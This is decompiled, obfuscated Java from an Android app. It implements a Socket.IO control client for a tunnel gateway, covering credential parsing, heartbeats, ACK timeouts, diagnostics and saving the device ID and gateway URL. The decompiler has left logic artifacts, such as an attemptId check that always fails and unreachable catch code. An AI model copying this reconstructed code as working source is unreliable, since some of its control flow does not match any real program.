        if (strO.isEmpty() || strO2.isEmpty() || strO3.isEmpty() || jM <= 0 || jM2 <= 0) {
            o2.l("incomplete registered credentials");
            return null;
        }
        JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("protocolCapabilities");
        h2.i iVar = new h2.i();
        if (jSONObjectOptJSONObject != null) {
            jSONObjectOptJSONObject.optBoolean("processExitObservationsV4", false);
            jSONObjectOptJSONObject.optBoolean("a11yTransitionsV2", false);
            jSONObjectOptJSONObject.optBoolean("reconnectInstabilityEpisodesV1", false);
            jSONObjectOptJSONObject.optBoolean("controlResumeV1", false);
            iVar.f2052a = jSONObjectOptJSONObject.optBoolean("screenOffFastRecoveryV1", false);
        }
        Object objOpt = jSONObject.opt("screenOffFastRecoveryV1");
        iVar.f2052a = (objOpt instanceof Boolean) && ((Boolean) objOpt).booleanValue();
        Object objOpt2 = jSONObject.opt("controlContinuity");
        String strO4 = "";
        if (objOpt2 == null || objOpt2 == JSONObject.NULL) {
            str = "";
            str2 = str;
        } else {
            if (!(objOpt2 instanceof JSONObject)) {
                o2.l("controlContinuity must be an object");
                return null;
            }
            JSONObject jSONObject2 = (JSONObject) objOpt2;
            if (L(jSONObject2) != 1) {
                o2.l("unsupported controlContinuity version");
                return null;
            }
            String strO5 = O("credential", jSONObject2);
            if (strO5.isEmpty() || strO5.length() > 8192) {
                o2.l("invalid control continuity credential");
                return null;
            }
            if (jSONObject2.has("attemptId")) {
                strO4 = O("attemptId", jSONObject2);
                if (strO4.length() >= 16 && strO4.length() <= 128) {
                    for (int i3 = 0; i3 < strO4.length(); i3++) {
                        char cCharAt = strO4.charAt(i3);
                        if ((cCharAt >= 'a' && cCharAt <= 'z') || ((cCharAt >= 'A' && cCharAt <= 'Z') || ((cCharAt >= '0' && cCharAt <= '9') || cCharAt == '-' || cCharAt == '_'))) {
                        }
                    }
                }
                o2.l("invalid control continuity attemptId");
                return null;
            }
            str2 = strO4;
            str = strO5;
        }
        return new h2.e(strO, strO2, strO3, jM, jM2, iVar, str, str2);
    }

    public final String B() {
        try {
            PowerManager powerManager = (PowerManager) this.f1502a.getSystemService(PowerManager.class);
            if (powerManager == null) {
                return "unknown";
            }
            return powerManager.isDeviceIdleMode() ? "idle" : "active";
        } catch (RuntimeException unused) {
            return "unknown";
        }
    }

    public final void C(JSONObject jSONObject, h2.e eVar) {
        AtomicReference atomicReference;
        Object objOpt = jSONObject.opt("mediaToken");
        if (objOpt instanceof String) {
            String str = (String) objOpt;
            if (str.isEmpty()) {
                return;
            }
            h2.e eVar2 = new h2.e(eVar.f1979a, eVar.f1980b, str, eVar.f1982d, jSONObject.optLong("serverTime", eVar.f1983e), eVar.f1984f, eVar.f1985g, eVar.f1986h);
            do {
                atomicReference = this.N;
                if (atomicReference.compareAndSet(eVar, eVar2)) {
                    g.j jVar = this.f1508d;
                    if (jVar != null) {
                        ((cf) jVar.f1415d).f3702f.execute(new ja(jVar, jVar.f1413b, (AtomicReference) jVar.f1414c, eVar2, 5));
                        return;
                    }
                    return;
                }
            } while (atomicReference.get() == eVar);
        }
    }

    public final void D(long j3, h2.m mVar) {
        int i3;
        if (j3 == this.f1533x.get() && this.N.get() == null) {
            if (this.f1529t.compareAndSet(false, true)) {
                AtomicReference atomicReference = this.O;
                while (!atomicReference.compareAndSet(null, mVar) && atomicReference.get() == null) {
                }
                this.f1528s.set(false);
                this.f1533x.incrementAndGet();
                this.f1516h.getClass();
                long jElapsedRealtime = SystemClock.elapsedRealtime();
                h2.g gVarQ = Q(h2.g.l(5, mVar, this.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime - this.V), p()), jElapsedRealtime);
                this.U = gVarQ;
                f(mVar);
                E();
                ((AtomicBoolean) this.f1520j.f5972d).set(true);
                this.f1514g.i();
                K();
                Log.w("SocketControlClient", "control registration rejected code=" + mVar.f2067c + " retryable=" + mVar.f2068d + " retryAfterMs=" + mVar.f2069e);
                g.j jVar = this.f1508d;
                if (jVar != null) {
                    String str = mVar.f2067c;
                    str.getClass();
                    switch (str) {
                        case "duplicate_session":
                            i3 = 6;
                            break;
                        case "store_unavailable":
                        case "server_busy":
                            i3 = 8;
                            break;
                        case "client_superseded":
                            i3 = 7;
                            break;
                        default:
                            i3 = 9;
                            break;
                    }
                    ((cf) jVar.f1415d).f3702f.execute(new y9(jVar, jVar.f1413b, i3, mVar, gVarQ));
                }
            }
        }
    }

    public final void E() {
        w0.s sVar = this.f1514g;
        sVar.f5835a.clear();
        try {
            w0.k kVar = sVar.f3428e;
            if (kVar != null) {
                kVar.b("error", this.S);
            }
        } catch (RuntimeException unused) {
            Log.w("SocketControlClient", "failed to remove Socket.IO manager error listener");
        }
    }

    public final void F(String str, final IOException iOException, final h2.g gVar) {
        int i3;
        final g.j jVar = this.f1508d;
        if (jVar != null) {
            boolean z2 = this.W;
            String lowerCase = str.toLowerCase(Locale.ROOT);
            if (lowerCase.contains("ping") || lowerCase.contains("heartbeat")) {
                i3 = 3;
            } else {
                i3 = !z2 ? 2 : 4;
            }
            final int i4 = i3;
            ue ueVar = ((cf) jVar.f1415d).f3702f;
            final int i5 = jVar.f1413b;
            final AtomicReference atomicReference = (AtomicReference) jVar.f1414c;
            ueVar.execute(new Runnable() { // from class: w1.xe
                @Override // java.lang.Runnable
                public final void run() {
                    g.j jVar2 = jVar;
                    int i6 = i5;
                    AtomicReference atomicReference2 = atomicReference;
                    int i7 = i4;
                    IOException iOException2 = iOException;
                    h2.g gVar2 = gVar;
                    cf cfVar = (cf) jVar2.f1415d;
                    g2.a0 a0Var = (g2.a0) atomicReference2.get();
                    if (i6 != cfVar.f3708i.get() || a0Var == null || a0Var != cfVar.f3727s0 || cfVar.f3723q.get() == i6) {
                        return;
                    }
                    try {
                        a0Var.g(1);
                    } catch (RuntimeException e3) {
                        Log.w("TunnelManager", "failed to stop disconnected control client", e3);
                    }
                    cfVar.U(i6, i7, iOException2, gVar2);
                }
            });
        }
    }

    public final boolean G(w wVar) {
        synchronized (this.f1523m) {
            try {
                if (this.f1524o.get(Long.valueOf(wVar.f1772a)) != wVar) {
                    return false;
                }
                this.f1524o.remove(Long.valueOf(wVar.f1772a));
                ScheduledFuture scheduledFuture = wVar.f1776e;
                wVar.f1776e = null;
                wVar.f1777f = 0L;
                if (scheduledFuture == null) {
                    return true;
                }
                scheduledFuture.cancel(false);
                return true;
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public final void I(t tVar, long j3) {
        this.M.set(tVar);
        this.L.set(j3);
        this.f1531v.set(false);
    }

    public final boolean J() {
        long j3 = this.E.get();
        this.f1516h.getClass();
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        return j3 > 0 && jElapsedRealtime >= j3 && jElapsedRealtime - j3 >= 53000;
    }

    public final void K() {
        this.f1525p.shutdownNow();
        this.f1526q.shutdownNow();
        this.f1527r.shutdownNow();
    }

    public final void P(String str, u uVar) {
        long j3;
        if (Thread.holdsLock(this.f1521k)) {
            uVar.run();
            return;
        }
        this.f1516h.getClass();
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        synchronized (this.n) {
            j3 = this.f1517h0 + 1;
            this.f1517h0 = j3;
            this.f1519i0.put(Long.valueOf(j3), new s(str, jElapsedRealtime));
        }
        boolean z2 = true;
        try {
            synchronized (this.f1521k) {
                this.f1516h.getClass();
                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                long jMax = Math.max(0L, jElapsedRealtime2 - jElapsedRealtime);
                synchronized (this.n) {
                    try {
                        this.f1519i0.remove(Long.valueOf(j3));
                        z2 = false;
                        if (jMax > this.f1505b0 || this.f1507c0.isEmpty()) {
                            this.f1505b0 = jMax;
                            this.f1507c0 = str;
                        }
                        this.f1513f0 = str;
                        this.f1515g0 = jElapsedRealtime2;
                    } catch (Throwable th) {
                        throw th;
                    }
                }
                try {
                    uVar.run();
                    this.f1516h.getClass();
                    long jMax2 = Math.max(0L, SystemClock.elapsedRealtime() - jElapsedRealtime2);
                    synchronized (this.n) {
                        try {
                            if (jMax2 > this.f1509d0 || this.f1511e0.isEmpty()) {
                                this.f1509d0 = jMax2;
                                this.f1511e0 = str;
                            }
                            this.f1513f0 = "";
                            this.f1515g0 = -1L;
                        } catch (Throwable th2) {
                            throw th2;
                        }
                    }
                } catch (Throwable th3) {
                    this.f1516h.getClass();
                    long jMax3 = Math.max(0L, SystemClock.elapsedRealtime() - jElapsedRealtime2);
                    synchronized (this.n) {
                        try {
                            if (jMax3 > this.f1509d0 || this.f1511e0.isEmpty()) {
                                this.f1509d0 = jMax3;
                                this.f1511e0 = str;
                            }
                            this.f1513f0 = "";
                            this.f1515g0 = -1L;
                            throw th3;
                        } catch (Throwable th4) {
                            throw th4;
                        }
                    }
                }
            }
        } catch (Throwable th5) {
            if (z2) {
                synchronized (this.n) {
                    this.f1519i0.remove(Long.valueOf(j3));
                }
            }
            throw th5;
        }
    }

    public final h2.g Q(h2.g gVar, long j3) {
        return R(gVar, j3, (z) this.R.get(), (b) ((AtomicReference) this.f1520j.f5973e).get());
    }

    /* JADX WARN: Code duplicated, block: B:67:0x0218  */
    public final h2.g R(h2.g gVar, long j3, z zVar, b bVar) {
        long[] jArr;
        int size;
        long j4;
        long jMax;
        long j5;
        String str;
        String str2;
        long j6;
        String str3;
        long j7;
        String str4;
        long j8;
        long j9;
        d dVarC;
        t tVar = (t) this.M.get();
        v vVar = (v) this.K.get();
        String str5 = tVar.f1742c;
        long jA = a(this.L.get(), j3);
        long jA2 = a(this.E.get(), j3);
        long j10 = this.f1533x.get();
        long j11 = this.B.get();
        long jA3 = a(this.F.get(), j3);
        long j12 = this.G.get();
        long j13 = j12 > 0 ? j12 : -1L;
        long j14 = this.H.get();
        h2.g gVar2 = new h2.g(gVar.f2002a, gVar.O, gVar.f2003b, gVar.f2004c, gVar.f2005d, gVar.f2006e, gVar.f2007f, gVar.f2008g, gVar.f2009h, gVar.f2010i, gVar.f2011j, gVar.f2012k, gVar.f2013l, gVar.f2014m, gVar.n, gVar.f2015o, gVar.f2016p, str5, jA, jA2, j10, j11, jA3, j13, j14 > 0 ? j14 : -1L, this.I.get(), vVar.f1764a, B(), gVar.B, gVar.C, gVar.D, gVar.E, gVar.F, gVar.G, gVar.H, gVar.I, gVar.J, gVar.K, gVar.L, gVar.M, gVar.N);
        this.f1516h.getClass();
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        synchronized (this.f1523m) {
            try {
                Iterator it = this.f1524o.values().iterator();
                long jMax2 = -1;
                while (it.hasNext()) {
                    long j15 = ((w) it.next()).f1777f;
                    if (j15 != 0) {
                        long j16 = jElapsedRealtime - j15;
                        if (j16 >= 0) {
                            jMax2 = Math.max(jMax2, j16);
                        }
                    }
                }
                jArr = new long[]{this.f1524o.size(), jMax2};
            } catch (Throwable th) {
                throw th;
            }
        }
        b1 b1Var = (b1) this.Q.get();
        if (b1Var == null) {
            j4 = 0;
        } else {
            synchronized (b1Var.f1545a) {
                size = b1Var.f1546b.size();
            }
            j4 = size;
        }
        synchronized (this.n) {
            try {
                long j17 = this.Y;
                jMax = j17 < 0 ? -1L : Math.max(0L, jElapsedRealtime - j17);
                long j18 = this.f1503a0.isEmpty() ? -1L : this.Z;
                String str6 = this.f1503a0;
                long j19 = jArr[1];
                if (j19 > j18) {
                    str6 = "stream_ack_timeout";
                    j5 = j19;
                } else {
                    j5 = j18;
                }
                str = str6;
                long j20 = this.f1509d0;
                String str7 = this.f1511e0;
                long j21 = this.f1505b0;
                String str8 = this.f1507c0;
                str2 = str8;
                for (s sVar : this.f1519i0.values()) {
                    long j22 = jElapsedRealtime;
                    long j23 = j20;
                    long jMax3 = Math.max(0L, j22 - sVar.f1726a);
                    if (jMax3 > j21 || str2.isEmpty()) {
                        str2 = sVar.f1727b;
                        j21 = jMax3;
                    }
                    jElapsedRealtime = j22;
                    j20 = j23;
                }
                long j24 = jElapsedRealtime;
                long j25 = j20;
                long j26 = this.f1515g0;
                if (j26 >= 0) {
                    long jMax4 = Math.max(0L, j24 - j26);
                    if (jMax4 > j25 || str7.isEmpty()) {
                        str7 = this.f1513f0;
                        j6 = jMax4;
                    } else {
                        j6 = j25;
                    }
                } else {
                    j6 = j25;
                }
                str3 = str7;
                j7 = jArr[0];
                str4 = this.X;
                j8 = str2.isEmpty() ? -1L : j21;
                j9 = str3.isEmpty() ? -1L : j6;
            } catch (Throwable th2) {
                throw th2;
            }
        }
        h2.g gVar3 = new h2.g(gVar2.f2002a, gVar2.O, gVar2.f2003b, gVar2.f2004c, gVar2.f2005d, gVar2.f2006e, gVar2.f2007f, gVar2.f2008g, gVar2.f2009h, gVar2.f2010i, gVar2.f2011j, gVar2.f2012k, gVar2.f2013l, gVar2.f2014m, gVar2.n, gVar2.f2015o, gVar2.f2016p, gVar2.f2017q, gVar2.f2018r, gVar2.f2019s, gVar2.f2020t, gVar2.f2021u, gVar2.f2022v, gVar2.f2023w, gVar2.f2024x, gVar2.f2025y, gVar2.f2026z, gVar2.A, j7, j4, str4, jMax, j5, str, j8, str2, j9, str3, gVar2.L, gVar2.M, gVar2.N);
        c cVar = vVar.f1765b;
        y.l lVar = this.f1518i;
        lVar.getClass();
        try {
            dVarC = ((b2.m) lVar.f5991c).c();
        } catch (RuntimeException unused) {
            dVarC = d.f1557m;
        }
        h2.f fVar = new h2.f(cVar.f1552a, cVar.f1553b, cVar.f1554c, cVar.f1555d, dVarC.f1558a, dVarC.f1559b, dVarC.f1560c, dVarC.f1561d, dVarC.f1562e, dVarC.f1563f, dVarC.f1564g, dVarC.f1565h, dVarC.f1566i, dVarC.f1567j, dVarC.f1568k, dVarC.f1569l);
        long j27 = gVar3.f2002a;
        int i3 = gVar3.O;
        int i4 = gVar3.f2003b;
        h2.g gVar4 = new h2.g(j27, i3, i4, gVar3.f2004c, gVar3.f2005d, gVar3.f2006e, gVar3.f2007f, gVar3.f2008g, gVar3.f2009h, gVar3.f2010i, gVar3.f2011j, gVar3.f2012k, gVar3.f2013l, gVar3.f2014m, gVar3.n, gVar3.f2015o, gVar3.f2016p, gVar3.f2017q, gVar3.f2018r, gVar3.f2019s, gVar3.f2020t, gVar3.f2021u, gVar3.f2022v, gVar3.f2023w, gVar3.f2024x, gVar3.f2025y, gVar3.f2026z, gVar3.A, gVar3.B, gVar3.C, gVar3.D, gVar3.E, gVar3.F, gVar3.G, gVar3.H, gVar3.I, gVar3.J, gVar3.K, gVar3.L, gVar3.M, fVar);
        b bVar2 = bVar == null ? b.f1539e : bVar;
        int i5 = bVar2.f1540a;
        String str9 = bVar2.f1541b;
        int i6 = bVar2.f1542c;
        int i7 = i5 >= 0 ? i5 : i4;
        if (i5 < 0 && str9.isEmpty()) {
            str9 = gVar4.f2004c;
        }
        String str10 = str9;
        if (i6 < 0) {
            i6 = gVar4.f2006e;
        }
        h2.g gVar5 = new h2.g(j27, gVar4.O, i7, str10, gVar4.f2005d, i6, gVar4.f2007f, gVar4.f2008g, gVar4.f2009h, gVar4.f2010i, gVar4.f2011j, gVar4.f2012k, gVar4.f2013l, gVar4.f2014m, gVar4.n, gVar4.f2015o, gVar4.f2016p, gVar4.f2017q, gVar4.f2018r, gVar4.f2019s, gVar4.f2020t, gVar4.f2021u, gVar4.f2022v, gVar4.f2023w, gVar4.f2024x, gVar4.f2025y, gVar4.f2026z, gVar4.A, gVar4.B, gVar4.C, gVar4.D, gVar4.E, gVar4.F, gVar4.G, gVar4.H, gVar4.I, gVar4.J, gVar4.K, gVar4.L, gVar4.M, gVar4.N);
        return zVar == null ? gVar5 : new h2.g(j27, gVar5.O, i7, gVar5.f2004c, gVar5.f2005d, gVar5.f2006e, gVar5.f2007f, gVar5.f2008g, gVar5.f2009h, gVar5.f2010i, gVar5.f2011j, gVar5.f2012k, gVar5.f2013l, gVar5.f2014m, gVar5.n, gVar5.f2015o, gVar5.f2016p, gVar5.f2017q, gVar5.f2018r, gVar5.f2019s, gVar5.f2020t, gVar5.f2021u, gVar5.f2022v, gVar5.f2023w, gVar5.f2024x, gVar5.f2025y, gVar5.f2026z, gVar5.A, gVar5.B, gVar5.C, gVar5.D, gVar5.E, gVar5.F, gVar5.G, gVar5.H, gVar5.I, gVar5.J, gVar5.K, zVar.f1831b, zVar.f1832c, gVar5.N);
    }

    public final void b(w wVar) {
        a0 a0Var;
        synchronized (this.f1523m) {
            if (this.f1524o.get(Long.valueOf(wVar.f1772a)) != wVar) {
                return;
            }
            try {
                this.f1516h.getClass();
                long jElapsedRealtime = SystemClock.elapsedRealtime() + 5000;
                wVar.f1777f = jElapsedRealtime;
                String str = "stream_ack_timeout";
                a2.h hVar = new a2.h(this, wVar, 9);
                TimeUnit timeUnit = TimeUnit.MILLISECONDS;
                a0Var = this;
                try {
                    wVar.f1776e = this.f1526q.schedule(new m(a0Var, str, jElapsedRealtime, hVar), 5000L, timeUnit);
                } catch (RejectedExecutionException e3) {
                    e = e3;
                    RejectedExecutionException rejectedExecutionException = e;
                    a0Var.f1524o.remove(Long.valueOf(wVar.f1772a));
                    wVar.f1777f = 0L;
                    throw new IOException("Socket.IO logical stream ACK scheduler stopped", rejectedExecutionException);
                }
            } catch (RejectedExecutionException e4) {
                e = e4;
                a0Var = this;
            }
        }
    }

    public final void e() {
        w[] wVarArr;
        synchronized (this.f1523m) {
            wVarArr = (w[]) this.f1524o.values().toArray(new w[0]);
            this.f1524o.clear();
        }
        for (w wVar : wVarArr) {
            ScheduledFuture scheduledFuture = wVar.f1776e;
            wVar.f1776e = null;
            wVar.f1777f = 0L;
            if (scheduledFuture != null) {
                scheduledFuture.cancel(false);
            }
        }
    }

    public final void f(IOException iOException) {
        g.j jVar;
        Object obj = null;
        b1 b1Var = (b1) this.Q.getAndSet(null);
        e();
        if (b1Var != null) {
            b1Var.a(iOException);
        }
        if (((h2.e) this.N.getAndSet(null)) == null || (jVar = this.f1508d) == null) {
            return;
        }
        ((cf) jVar.f1415d).f3702f.execute(new ja(jVar, jVar.f1413b, (AtomicReference) jVar.f1414c, obj, 5));
    }

    public final h2.g g(int i3) {
        boolean andSet = this.f1528s.getAndSet(false);
        this.f1529t.set(true);
        ((AtomicBoolean) this.f1520j.f5972d).set(true);
        this.f1516h.getClass();
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        h2.g gVarQ = Q(h2.g.d(i3, this.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime - this.V)), jElapsedRealtime);
        this.U = gVarQ;
        f(new IOException("control client closed"));
        if (andSet) {
            E();
            this.f1514g.i();
            K();
        }
        return gVarQ;
    }

    public final void j(String str, JSONObject jSONObject, long j3, final long j4) {
        final String str2;
        final long j5;
        if (!this.f1528s.get() || !this.f1514g.f3425b) {
            return;
        }
        try {
            str2 = str;
            j5 = j3;
            try {
                this.f1514g.a(str2, jSONObject, new w0.a() { // from class: g2.q
                    @Override // w0.a
                    public final void a(Object[] objArr) {
                        a0 a0Var;
                        long j6;
                        long j7;
                        a0 a0Var2 = this.f1711a;
                        long j8 = j5;
                        String str3 = str2;
                        long j9 = j4;
                        JSONObject jSONObjectL = a0.l(objArr);
                        h2.e eVar = (h2.e) a0Var2.N.get();
                        if (jSONObjectL == null || eVar == null || !a0.q(jSONObjectL, eVar.f1982d) || (jSONObjectL.has("sequence") && a0.o(jSONObjectL) != j8)) {
                            long jIncrementAndGet = a0Var2.B.incrementAndGet();
                            StringBuilder sb = new StringBuilder("invalid Socket.IO heartbeat ACK event=");
                            sb.append(str3);
                            sb.append(" sequence=");
                            sb.append(j8);
                            j4.d(sb, " count=", jIncrementAndGet, " phase=");
                            sb.append(((t) a0Var2.M.get()).f1742c);
                            Log.w("SocketControlClient", sb.toString());
                            return;
                        }
                        a0Var2.f1516h.getClass();
                        long jElapsedRealtime = SystemClock.elapsedRealtime();
                        a0Var2.D.set(jElapsedRealtime);
                        String str4 = eVar.f1980b;
                        long jN = a0.N(jSONObjectL.opt("serverReceivedAt"));
                        long jN2 = a0.N(jSONObjectL.opt("serverTime"));
                        if (str4 == null || str4.isEmpty() || jN <= 0 || jN2 < jN || j9 < 0 || jElapsedRealtime < j9) {
                            a0Var = a0Var2;
                            j6 = jElapsedRealtime;
                            j7 = 0;
                        } else {
                            long j10 = jElapsedRealtime - j9;
                            long jM0 = w1.n.m0(jN, j10);
                            if (jM0 < jN2) {
                                jM0 = w1.n.m0(jN2, j10);
                            }
                            z3 z3Var = new z3(jM0, jElapsedRealtime);
                            synchronized (w1.n.A) {
                                try {
                                    y.l lVar = w1.n.B;
                                    if (lVar != null) {
                                        a0Var = a0Var2;
                                        if (str4.equals((String) lVar.f5991c)) {
                                            z3 z3Var2 = (z3) lVar.f5992d;
                                            if (z3Var2 == null) {
                                                w1.n.B = new y.l(str4, z3Var);
                                                j6 = jElapsedRealtime;
                                                j7 = 0;
                                            } else {
                                                j6 = jElapsedRealtime;
                                                long j11 = jM0;
                                                j7 = 0;
                                                long jM1 = w1.n.m0(z3Var2.f5686a, Math.max(0L, j6 - z3Var2.f5687b));
                                                if (j11 < jM1 || jN2 > jM1) {
                                                    w1.n.B = new y.l(str4, z3Var);
                                                }
                                            }
                                        }
                                    } else {
                                        a0Var = a0Var2;
                                    }
                                    j6 = jElapsedRealtime;
                                    j7 = 0;
                                } catch (Throwable th) {
                                    throw th;
                                }
                            }
                        }
                        boolean zEquals = "heartbeat".equals(str3);
                        long jO = zEquals ? a0.o(jSONObjectL) : j7;
                        long j12 = zEquals ? j9 : -1L;
                        a0 a0Var3 = a0Var;
                        a0Var3.s(j6, jO, j12);
                        a0Var3.C(jSONObjectL, eVar);
                    }
                });
            } catch (RuntimeException unused) {
                Log.w("SocketControlClient", "Socket.IO heartbeat emit failed event=" + str2 + " sequence=" + j5);
            }
        } catch (RuntimeException unused2) {
            str2 = str;
            j5 = j3;
        }
    }

    public final void m() {
        h2.e eVar;
        long j3 = this.A.get();
        if (j3 > 0 && (eVar = (h2.e) this.N.get()) != null && this.f1528s.get() && this.f1514g.f3425b) {
            try {
                JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("generation", eVar.f1982d).put("capabilities", d(i(this.T)));
                p pVar = new p(this, j3, eVar);
                if (this.f1528s.get() && this.f1514g.f3425b) {
                    try {
                        P("control", new e2.h(this, jSONObjectPut, pVar));
                    } catch (IOException | RuntimeException unused) {
                        Log.w("SocketControlClient", "Socket.IO control event emit failed event=capabilities:update");
                    }
                }
            } catch (JSONException e3) {
                throw new IllegalStateException(e3);
            }
        }
    }

    public final long p() {
        long j3 = this.D.get();
        this.f1516h.getClass();
        return a(j3, SystemClock.elapsedRealtime());
    }

    public final void r() {
        this.f1516h.getClass();
        s(SystemClock.elapsedRealtime(), 0L, -1L);
    }

    public final void s(long j3, long j4, long j5) {
        this.E.set(j3);
        if (j4 > 0) {
            this.H.accumulateAndGet(j4, new w1.z());
        }
        if (j5 > 0 && j3 >= j5) {
            this.I.set(j3 - j5);
        }
        this.R.set(null);
        this.f1530u.set(false);
        Context context = this.f1502a;
        if (context != null) {
            int i3 = c2.q.f456b;
            Object obj = c2.o.f443a;
            Context applicationContext = context.getApplicationContext();
            if (applicationContext == null) {
                applicationContext = context;
            }
            File fileD = c2.o.d(applicationContext);
            if (fileD != null) {
                long jCurrentTimeMillis = System.currentTimeMillis();
                long jElapsedRealtime = SystemClock.elapsedRealtime();
                c2.m mVarA = c2.o.a(applicationContext);
                int i4 = mVarA.f440c;
                long j6 = mVarA.f439b;
                c2.n nVar = new c2.n(true, jCurrentTimeMillis, jElapsedRealtime, i4, j6);
                synchronized (c2.o.f443a) {
                    try {
                        try {
                            File parentFile = fileD.getParentFile();
                            if (parentFile != null && (parentFile.exists() || parentFile.mkdirs() || parentFile.isDirectory())) {
                                RandomAccessFile randomAccessFile = new RandomAccessFile(fileD, "rw");
                                try {
                                    FileChannel channel = randomAccessFile.getChannel();
                                    try {
                                        FileLock fileLockLock = channel.lock();
                                        try {
                                            randomAccessFile.setLength(0L);
                                            randomAccessFile.seek(0L);
                                            randomAccessFile.writeInt(1195917873);
                                            randomAccessFile.writeInt(1);
                                            randomAccessFile.writeLong(jCurrentTimeMillis);
                                            randomAccessFile.writeLong(jElapsedRealtime);
                                            randomAccessFile.writeInt(i4);
                                            randomAccessFile.writeLong(j6);
                                            randomAccessFile.getFD().sync();
                                            if (fileLockLock != null) {
                                                fileLockLock.close();
                                            }
                                            channel.close();
                                            randomAccessFile.close();
                                            c2.o.f444b.set(nVar);
                                            c2.o.f447e = jElapsedRealtime;
                                            return;
                                        } catch (Throwable th) {
                                            if (fileLockLock == null) {
                                                throw th;
                                            }
                                            try {
                                                fileLockLock.close();
                                                throw th;
                                            } catch (Throwable th2) {
                                                th.addSuppressed(th2);
                                                throw th;
                                            }
                                            try {
                                                randomAccessFile.close();
                                                throw th;
                                            } catch (Throwable th3) {
                                                th.addSuppressed(th3);
                                                throw th;
                                            }
                                        }
                                    } catch (Throwable th4) {
                                        if (channel == null) {
                                            throw th4;
                                        }
                                        try {
                                            channel.close();
                                            throw th4;
                                        } catch (Throwable th5) {
                                            th4.addSuppressed(th5);
                                            throw th4;
                                        }
                                        throw th;
                                    }
                                } catch (Throwable th6) {
                                    randomAccessFile.close();
                                    throw th6;
                                }
                            }
                        } catch (Throwable th7) {
                            throw th7;
                        }
                    } catch (Throwable th8) {
                        Log.w("GatewayHeartbeatLease", "mark failed: " + th8.getMessage());
                    }
                }
            }
            c2.u.s(context, "last_heartbeat_time", System.currentTimeMillis());
        }
    }

    public final void t() {
        this.f1516h.getClass();
        this.D.set(SystemClock.elapsedRealtime());
    }

    public final void v(long j3, Object... objArr) {
        JSONObject jSONObjectL;
        boolean zF;
        boolean z2;
        if (j3 == this.f1533x.get() && this.f1528s.get() && (jSONObjectL = l(objArr)) != null) {
            h2.m mVarA = A(jSONObjectL);
            if (mVarA != null) {
                D(j3, mVarA);
                return;
            }
            if (this.f1514g.f3425b) {
                try {
                    h2.e eVarZ = z(jSONObjectL);
                    x xVar = (x) this.P.get();
                    if (xVar == null || xVar.f1803a != j3) {
                        return;
                    }
                    synchronized (this.f1522l) {
                        try {
                            h2.e eVar = (h2.e) this.N.get();
                            if (eVar == null || eVarZ.f1982d >= eVar.f1982d) {
                                if (eVar != null && eVar.f1982d == eVarZ.f1982d) {
                                    if (eVar.f1979a.equals(eVarZ.f1979a) && eVar.f1980b.equals(eVarZ.f1980b)) {
                                        t();
                                        r();
                                    }
                                    return;
                                }
                                y.l lVar = this.f1512f;
                                if (lVar == null) {
                                    zF = eVarZ.f1985g.isEmpty();
                                } else {
                                    try {
                                        zF = lVar.f(eVarZ, (String) this.f1504b.f5973e, xVar.f1804b, xVar.f1805c);
                                    } catch (RuntimeException unused) {
                                        zF = false;
                                    }
                                }
                                z3 z3Var = null;
                                if (zF) {
                                    this.N.set(eVarZ);
                                    AtomicReference atomicReference = this.P;
                                    while (!atomicReference.compareAndSet(xVar, null) && atomicReference.get() == xVar) {
                                    }
                                    z2 = false;
                                } else {
                                    z2 = true;
                                }
                                if (z2) {
                                    if (j3 == this.f1533x.get() && this.f1529t.compareAndSet(false, true)) {
                                        IOException iOException = new IOException("control continuity credential persistence failed");
                                        this.f1528s.set(false);
                                        this.f1533x.incrementAndGet();
                                        this.f1516h.getClass();
                                        long jElapsedRealtime = SystemClock.elapsedRealtime();
                                        h2.g gVarQ = Q(h2.g.l(5, iOException, this.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime - this.V), p()), jElapsedRealtime);
                                        this.U = gVarQ;
                                        f(iOException);
                                        E();
                                        ((AtomicBoolean) this.f1520j.f5972d).set(true);
                                        this.f1514g.i();
                                        K();
                                        Log.w("SocketControlClient", "control registration withheld persistenceSucceeded=false");
                                        g.j jVar = this.f1508d;
                                        if (jVar != null) {
                                            ((cf) jVar.f1415d).f3702f.execute(new y9(jVar, jVar.f1413b, 2, iOException, gVarQ));
                                            return;
                                        }
                                        return;
                                    }
                                    return;
                                }
                                String str = eVarZ.f1980b;
                                long j4 = eVarZ.f1983e;
                                long j5 = xVar.f1806d;
                                this.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                if ((str == null || str.isEmpty()) ? false : true) {
                                    if (j4 > 0 && j5 >= 0 && jElapsedRealtime2 >= j5) {
                                        z3Var = new z3(w1.n.m0(j4, jElapsedRealtime2 - j5), jElapsedRealtime2);
                                    }
                                    synchronized (w1.n.A) {
                                        w1.n.B = new y.l(str, z3Var);
                                    }
                                }
                                t();
                                r();
                                this.f1530u.set(false);
                                this.W = true;
                                try {
                                    w0.k kVar = this.f1514g.f3428e;
                                    if (kVar != null) {
                                        kVar.f3394b = false;
                                    }
                                } catch (RuntimeException unused2) {
                                    Log.w("SocketControlClient", "failed to hand reconnect ownership to tunnel manager");
                                }
                                this.f1516h.getClass();
                                long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                                long jA = a(this.L.get(), jElapsedRealtime3);
                                I(t.f1740j, jElapsedRealtime3);
                                h2.b bVar = this.f1510e;
                                String str2 = eVarZ.f1979a;
                                Context context = (Context) bVar.f1959a;
                                if (str2 == null) {
                                    str2 = "";
                                }
                                c2.u.t(context, "deviceId", str2);
                                h2.b bVar2 = this.f1510e;
                                String str3 = (String) this.f1504b.f5972d;
                                bVar2.getClass();
                                String strA = a4.a(str3);
                                Context context2 = (Context) bVar2.f1959a;
                                if (strA == null) {
                                    strA = "";
                                }
                                c2.u.t(context2, "gatewayUrl", strA);
                                StringBuilder sb = new StringBuilder("control registered attempt=");
                                sb.append(j3);
                                j4.d(sb, " registrationDurationMs=", jA, " generation=");
                                sb.append(eVarZ.f1982d);
                                Log.i("SocketControlClient", sb.toString());
                                b1 b1Var = (b1) this.Q.getAndSet(new b1(eVarZ.f1982d, new d2.o(4, this)));
